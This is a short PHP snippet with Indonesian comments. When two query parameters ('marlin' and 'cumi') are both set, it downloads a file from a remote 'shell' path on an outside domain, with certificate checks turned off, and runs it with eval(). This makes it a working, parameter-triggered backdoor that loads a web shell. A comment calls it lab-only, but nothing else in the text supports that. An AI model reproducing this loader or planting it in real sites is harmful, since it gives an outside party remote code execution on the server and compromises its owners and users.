if (isset($_GET['marlin']) && isset($_GET['cumi'])) {  // <-- ganti jadi dua parameter beda
    
    // PERBAIKAN 3: Hapus semicolon dari dalam string
    $remote_url = "https://hypocriteseo.site/shell/compiler-cha-kwetiaw.txt";
    
    // Gunakan cURL (lebih handal dari file_get_contents)
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $remote_code = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code == 200 && !empty($remote_code)) {
        // PERINGATAN: eval() SANGAT BERBAHAYA! Hanya untuk testing di lab
        eval("?>" . $remote_code);
    } else {
        echo "Gagal mengambil script. HTTP Code: " . $http_code;
    }
    exit;
}
